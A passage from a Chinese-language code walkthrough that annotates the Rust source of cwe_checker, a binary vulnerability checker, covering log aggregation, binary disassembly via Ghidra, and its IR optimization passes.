<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">let</span> <span class="token keyword">mut</span> all_logs <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 否则汇总所有来源的日志</span>         <span class="token comment">// 聚合所有带有日志的对象的日志 </span>       all_logs<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span>project<span class="token punctuation">.</span><span class="token function">logs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 工程阶段日志</span>       all_logs<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span>control_flow_graph<span class="token punctuation">.</span><span class="token function">logs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// CFG 构建日志</span>       <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>function_signatures<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>function_signatures <span class="token punctuation">&#123;</span> <span class="token comment">// 函数签名日志</span>           all_logs<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span>function_signatures<span class="token punctuation">.</span><span class="token function">logs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">for</span> cwe_warnings <span class="token keyword">in</span> all_cwe_warnings<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 各CWE模块日志</span>           all_logs<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span>cwe_warnings<span class="token punctuation">.</span><span class="token function">logs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>         <span class="token keyword">if</span> args<span class="token punctuation">.</span>statistics <span class="token punctuation">&#123;</span>           <span class="token macro property">todo!</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">if</span> <span class="token operator">!</span>args<span class="token punctuation">.</span>verbose <span class="token punctuation">&#123;</span> <span class="token comment">// 非详细模式下，过滤掉 Debug 级别日志</span>           all_logs<span class="token punctuation">.</span><span class="token function">retain</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>log_msg<span class="token closure-punctuation punctuation">|</span></span> log_msg<span class="token punctuation">.</span>level <span class="token operator">!=</span> <span class="token class-name">LogLevel</span><span class="token punctuation">::</span><span class="token class-name">Debug</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>         all_logs   <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 展平成所有CWE告警列表</span>   <span class="token keyword">let</span> all_cwes<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token class-name">CweWarning</span><span class="token operator">></span> <span class="token operator">=</span> all_cwe_warnings<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flat_map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>x<span class="token closure-punctuation punctuation">|</span></span> x<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 根据参数选择输出到文件/控制台，支持JSON</span>   <span class="token function">print_all_messages</span><span class="token punctuation">(</span>all_logs<span class="token punctuation">,</span> all_cwes<span class="token punctuation">,</span> args<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">as_deref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="src-cwe-checker-lib-src-pipeline-mod-rs"><a href="#src-cwe-checker-lib-src-pipeline-mod-rs" class="headerlink" title="src\cwe_checker_lib\src\pipeline\mod.rs"></a>src\cwe_checker_lib\src\pipeline\mod.rs</h3><h4 id="disassemble-binary-反编译程序"><a href="#disassemble-binary-反编译程序" class="headerlink" title="disassemble_binary 反编译程序"></a>disassemble_binary 反编译程序</h4><p>功能：反编译二进制程序</p><p>在 run_with_ghidra 中被调用，传入参数为二进制文件路径、bare_metal_config、调试设置，返回二进制程序内容和 project 结构体</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> <span class="token punctuation">(</span>binary<span class="token punctuation">,</span> project<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">disassemble_binary</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>binary_file_path<span class="token punctuation">,</span> bare_metal_config_opt<span class="token punctuation">,</span> <span class="token operator">&amp;</span>debug_settings<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>以字节形式获取二进制文件的内容到 binary 字节向量</p></li><li><p>将二进制程序、文件路径、bare_metal_config、debug_settings 传递给 ghidra 进行分析，得到 project 结构体和原始 IR，相关代码位于 <a href="###src%5Ccwe_checker_lib%5Csrc%5Cutils%5Cghidra.rs">src\cwe_checker_lib\src\utils\ghidra.rs</a></p></li><li><p>调用 [project.optimize](####project.optimize 优化 IR) 对 IR 进行优化：cwe_checker 使用 Pcode 作为输入，将其转换为自己的中间表示（IR）进行漏洞检测</p></li><li><p>生成二进制文件的运行时内存映像表示，并全局调整一次内存地址，存放到 project.runtime_memory_image</p><blockquote><p>ghidra 为了分析方便可能会将整个程序移动到一个非零的地址，也就是加上了一个基址，所以在获取真实地址的时候需要减去基址，这里调整内存地址后续就无需再考虑基址问题</p></blockquote></li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">disassemble_binary</span><span class="token punctuation">(</span>    binary_file_path<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Path</span><span class="token punctuation">,</span>   <span class="token comment">// 二进制文件路径</span>    bare_metal_config_opt<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">BareMetalConfig</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 可选的裸机配置</span>    debug_settings<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Settings</span><span class="token punctuation">,</span>    <span class="token comment">// 调试设置</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">WithLogs</span><span class="token operator">&lt;</span><span class="token class-name">Project</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Error</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 返回（二进制内容，带日志的项目）或错误</span>        <span class="token keyword">let</span> binary<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token comment">// 读取二进制文件内容到字节向量，读取失败时添加上下文错误信息</span>        <span class="token namespace">std<span class="token punctuation">::</span>fs<span class="token punctuation">::</span></span><span class="token function">read</span><span class="token punctuation">(</span>binary_file_path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">context</span><span class="token punctuation">(</span><span class="token string">"Could not read from binary file path &#123;&#125;"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> project <span class="token operator">=</span> <span class="token function">get_project_from_ghidra</span><span class="token punctuation">(</span> <span class="token comment">// 从 Ghidra 获取项目信息</span>        binary_file_path<span class="token punctuation">,</span>  <span class="token comment">// 文件路径</span>        <span class="token operator">&amp;</span>binary<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token comment">// 二进制内容字节向量</span>        bare_metal_config_opt<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">// 裸机配置（克隆以避免所有权转移）</span>        debug_settings<span class="token punctuation">,</span>            <span class="token comment">// 调试设置</span>    <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token comment">// 规范化项目并收集其生成的日志消息，打印原始IR表示</span>    debug_settings<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>project<span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span> <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">Ir</span><span class="token punctuation">(</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">IrForm</span><span class="token punctuation">::</span><span class="token class-name">Raw</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    project<span class="token punctuation">.</span><span class="token function">optimize</span><span class="token punctuation">(</span>debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 对项目进行优化（应用各种IR变换）</span>    debug_settings<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span> <span class="token comment">// 打印优化后的IR表示</span>        <span class="token operator">&amp;</span>project<span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span>        <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">Ir</span><span class="token punctuation">(</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">IrForm</span><span class="token punctuation">::</span><span class="token class-name">Optimized</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 生成二进制文件的运行时内存映像表示</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> runtime_memory_image <span class="token operator">=</span> <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>bare_metal_config<span class="token punctuation">)</span> <span class="token operator">=</span> bare_metal_config_opt<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 如果提供了裸机配置，使用裸机模式生成内存映像</span>        <span class="token class-name">RuntimeMemoryImage</span><span class="token punctuation">::</span><span class="token function">new_from_bare_metal</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>binary<span class="token punctuation">,</span> bare_metal_config<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">context</span><span class="token punctuation">(</span><span class="token string">"Error while generating runtime memory image."</span><span class="token punctuation">)</span><span class="token operator">?</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 否则使用标准ELF/PE模式生成内存映像</span>        <span class="token class-name">RuntimeMemoryImage</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>binary<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">context</span><span class="token punctuation">(</span><span class="token string">"Error while generating runtime memory image."</span><span class="token punctuation">)</span><span class="token operator">?</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> project<span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">.</span>address_base_offset <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 全局调整一次内存地址，这样其他分析就不需要调整它们的地址</span>        runtime_memory_image<span class="token punctuation">.</span><span class="token function">add_global_memory_offset</span><span class="token punctuation">(</span>project<span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">.</span>address_base_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    project<span class="token punctuation">.</span>runtime_memory_image <span class="token operator">=</span> runtime_memory_image<span class="token punctuation">;</span> <span class="token comment">// 将内存映像赋值给项目</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span>binary<span class="token punctuation">,</span> project<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 返回（二进制内容，项目）元组</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="project-optimize-优化-IR"><a href="#project-optimize-优化-IR" class="headerlink" title="project.optimize 优化 IR"></a>project.optimize 优化 IR</h4><p>位于 src\cwe_checker_lib\src\intermediate_representation\project.rs</p><ul><li>IntraproceduralDeadBlockElimPass：删除函数内部不可达的基本快并移除无效控制流边与语句，例如入口不可达、恒真&#x2F;恒假条件折叠后的残留块、无条件跳转后的冗余分支等</li><li>InputExpressionPropagationPass： 沿赋值链传播“输入”表达式（参数、全局读、调用返回、内存加载等），在等价且安全的场合用来源替换表达式，减少临时变量层级</li><li>TrivialExpressionSubstitutionPass：对简单&#x2F;可决表达式进行代数化简与常量折叠，即完成中间简单计算的过程，例如<code>t = y &amp; 0 =&gt; t = 0</code>       <code>t = x + 0; t1 = 3 * 4 + t =&gt; t1 = 12 + x</code> </li><li>DeadVariableElimPass：删除对未使用变量的赋值，例如写死&#x2F;死存储，或被写入但未读的值</li><li>ControlFlowPropagationPass：简化分支条件、等价分支，消除恒真&#x2F;恒假路径</li><li>StackPointerAlignmentSubstitutionPass：利用按位与的对齐操作对齐栈指针</li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">optimize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> debug_settings<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Settings</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> logs <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 初始化日志收集器，用于收集优化过程中的日志信息</span>        <span class="token comment">// 运行过程内死块消除优化：移除函数内不可达的基本块</span>        <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span>  <span class="token comment">// 要优化的程序 IR</span>            <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token comment">// 无额外参数</span>            <span class="token class-name">IntraproceduralDeadBlockElimPass</span><span class="token punctuation">,</span> <span class="token comment">// 优化过程名称</span>            logs<span class="token punctuation">,</span>             <span class="token comment">// 日志收集器</span>            debug_settings<span class="token punctuation">,</span>   <span class="token comment">// 调试设置</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 运行输入表达式传播优化：将输入表达式沿着赋值传播</span>        <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">InputExpressionPropagationPass</span><span class="token punctuation">,</span>            logs<span class="token punctuation">,</span>            debug_settings<span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 运行平凡表达式替换优化：用结果替换简单的算术表达式</span>        <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">TrivialExpressionSubstitutionPass</span><span class="token punctuation">,</span>            logs<span class="token punctuation">,</span>            debug_settings<span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 运行死变量消除优化：移除对未使用变量的赋值</span>        <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>register_set<span class="token punctuation">,</span> <span class="token comment">// 需要寄存器集合信息</span>            <span class="token class-name">DeadVariableElimPass</span><span class="token punctuation">,</span>            logs<span class="token punctuation">,</span>            debug_settings<span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 运行控制流传播优化：简化具有相同条件的条件语句</span>        <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">ControlFlowPropagationPass</span><span class="token punctuation">,</span>            logs<span class="token punctuation">,</span>            debug_settings<span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 运行栈指针对齐替换优化：用减法替换逻辑AND对齐操作</span>        <span class="token macro property">run_ir_pass!</span><span class="token punctuation">[</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span>            <span class="token keyword">self</span><span class="token punctuation">,</span>             <span class="token comment">// 需要完整的项目信息</span>            <span class="token class-name">StackPointerAlignmentSubstitutionPass</span><span class="token punctuation">,</span>            logs<span class="token punctuation">,</span>            debug_settings<span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 验证各项优化的后置条件（仅在调试模式下）</span>        <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">IntraproceduralDeadBlockElimPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">InputExpressionPropagationPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">TrivialExpressionSubstitutionPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>register_set<span class="token punctuation">,</span> <span class="token class-name">DeadVariableElimPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">ControlFlowPropagationPass</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token macro property">debug_assert_postconditions!</span><span class="token punctuation">[</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">,</span>            <span class="token keyword">self</span><span class="token punctuation">,</span>            <span class="token class-name">StackPointerAlignmentSubstitutionPass</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">add_logs</span><span class="token punctuation">(</span>logs<span class="token punctuation">)</span> <span class="token comment">// 将收集的日志添加到项目中</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="src-cwe-checker-lib-src-utils-ghidra-rs"><a href="#src-cwe-checker-lib-src-utils-ghidra-rs" class="headerlink" title="src\cwe_checker_lib\src\utils\ghidra.rs"></a>src\cwe_checker_lib\src\utils\ghidra.rs</h3><p>功能：调用 ghidra 进行反编译，返回 Project 结构体指针</p><h4 id="get-project-from-ghidra-调用-ghidra-获取-Project-结构体信息"><a href="#get-project-from-ghidra-调用-ghidra-获取-Project-结构体信息" class="headerlink" title="get_project_from_ghidra 调用 ghidra 获取 Project 结构体信息"></a>get_project_from_ghidra 调用 ghidra 获取 Project 结构体信息</h4><ul><li><p>如果使用 –pcode-raw 参数，则获取指定文件中的 pcode，解析为 PcodeProject 结构体（与 PcodeRaw 结构一致，只是表现形式不同，将 json 转化成 rust 类型结构）</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Serialize, Deserialize, Debug, PartialEq, Eq, Clone)]</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">PcodeProject</span> <span class="token punctuation">&#123;</span>    program<span class="token punctuation">:</span> <span class="token class-name">Program</span><span class="token punctuation">,</span> <span class="token comment">// 程序代码</span>    register_properties<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">RegisterProperties</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 所有 CPU 架构特定寄存器的信息</span>    cpu_arch<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token comment">// CPU 架构</span>    external_functions<span class="token punctuation">:</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">ExternFunction</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 导入的函数</span>    entry_points<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 导出的函数（入口点）</span>    stack_pointer_register<span class="token punctuation">:</span> <span class="token class-name">Varnode</span><span class="token punctuation">,</span> <span class="token comment">// CPU 架构的栈指针寄存器</span>    calling_conventions<span class="token punctuation">:</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">CallingConvention</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 给定 CPU 架构的已知调用约定信息</span>    datatype_properties<span class="token punctuation">:</span> <span class="token class-name">DatatypeProperties</span><span class="token punctuation">,</span> <span class="token comment">// 包含 C 数据类型的属性，例如它们的大小</span>    image_base<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token comment">// 程序映像在内存中的基址</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取临时文件夹和时间戳，拼接得到唯一管道名称</p></li><li><p>调用 [generate_ghidra_call_command](####generate_ghidra_call_command 生成调用 ghidra 的命令) 函数生成调用 ghidra 的命令</p></li><li><p>调用 execute_ghidra 执行ghidra 并且获取 pcode，解析为 PcodeProject 结构体，执行失败将直接终止程序</p></li><li><p>调用 [parse_pcode_project_to_ir_project](####parse_pcode_project_to_ir_project 将 Pcode 项目解析为 IR 项目) 将 Pcode 项目解析为 IR 项目</p></li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">get_project_from_ghidra</span><span class="token punctuation">(</span>    file_path<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Path</span><span class="token punctuation">,</span> <span class="token comment">// 二进制文件路径</span>    binary<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token comment">// 二进制文件内容</span>    bare_metal_config_opt<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">BareMetalConfig</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 可选的裸机配置</span>    debug_settings<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Settings</span><span class="token punctuation">,</span>    <span class="token comment">// 调试设置</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">WithLogs</span><span class="token operator">&lt;</span><span class="token class-name">Project</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">Error</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 如果通过 --pcode-raw 指定过 pcode 则从文件获取 pcode</span>    <span class="token keyword">let</span> pcode_project <span class="token operator">=</span> <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>saved_pcode_raw<span class="token punctuation">)</span> <span class="token operator">=</span> debug_settings<span class="token punctuation">.</span><span class="token function">get_saved_pcode_raw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> file <span class="token operator">=</span> <span class="token namespace">std<span class="token punctuation">::</span>fs<span class="token punctuation">::</span></span><span class="token class-name">File</span><span class="token punctuation">::</span><span class="token function">open</span><span class="token punctuation">(</span>saved_pcode_raw<span class="token punctuation">)</span><span class="token comment">// 打开指定的 pcode 文件</span>            <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to open saved output of Pcode Extractor plugin."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> saved_pcode_raw <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         file<span class="token punctuation">.</span><span class="token function">read_to_string</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> saved_pcode_raw<span class="token punctuation">)</span><span class="token comment">// 从文件读取指定的 pcode</span>            <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to read saved Pcode Extractor plugin output"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        debug_settings<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>saved_pcode_raw<span class="token punctuation">,</span> <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">Pcode</span><span class="token punctuation">(</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">PcodeForm</span><span class="token punctuation">::</span><span class="token 